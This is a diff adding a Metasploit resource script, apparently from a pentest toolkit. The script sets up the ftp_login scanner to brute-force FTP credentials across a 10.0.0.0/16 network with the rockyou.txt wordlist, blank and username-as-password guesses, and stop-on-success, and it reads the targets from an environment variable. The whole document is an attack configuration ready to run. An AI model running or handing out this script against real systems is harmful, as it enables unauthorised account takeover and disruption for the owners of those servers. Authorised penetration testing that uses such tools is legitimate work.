@@ -1,0 +1,14 @@
+#Usage RHOSTS=10.0.0.0/16; msfconsole -r /opt/pentest/ftp_brute.rc -Lq
+use auxiliary/scanner/ftp/ftp_login
+set BLANK_PASSWORDS
+set BRUTEFORCE_SPEED 5
+set PASS_FILE /opt/pentest/rockyou.txt
+set USER_FILE /opt/pentest/users.txt
+set RPORT 21
+set STOP_ON_SUCCESS true
+set THREADS 5
+set VERBOSE true
+set USER_AS_PASS true
+<ruby>
+run_single("set RHOST ${ENV['RHOSTS']}")
+</ruby>
